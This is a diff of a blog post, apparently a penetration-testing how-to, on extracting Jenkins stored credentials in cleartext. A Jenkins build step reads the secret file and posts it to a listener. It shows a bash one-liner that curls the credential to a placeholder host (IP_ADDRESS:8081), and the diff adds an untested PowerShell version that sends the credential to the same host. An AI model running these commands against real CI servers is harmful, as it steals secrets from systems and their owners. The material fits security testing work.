@@ -25,6 +25,7 @@ Create a task and include the credential as a variable named "TEST" checking "Us
 
 ![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jenkinscredentials/Screenshot_1.png)
 
+<br>
 
 ### Step 2: Execute command line (shell) in Build Steps
 
@@ -44,8 +45,15 @@ whoami; ip a; TEST2=$(cat "$TEST"); curl http://IP_ADDRESS:8081/ --data-binary '
 
 The "whoami; ip a;" part is not necessary but you can use something like this to check the task is executed correctly even if step 3 fails. And you can use the port you prefer and not 8081.
 
-In this example the Jenkins master node is a Linux system, but I guess something similar can be used in Windows using Powershell :).
+In this example the Jenkins master node is a Linux system, but I guess something similar can be used in Windows using Powershell (please notice I did not test these next lines :) ):
 
+```
+$TEST2 = Get-Content $TEST -Raw
+$postParams = @{credential=$TEST2;}
+Invoke-WebRequest -Uri http://IP_ADDRESS:8081 -Method POST -Body $postParams
+```
+
+<br>
 
 ### Step 3: Set up a listener and (hopefully) receive the credential in cleartext
 
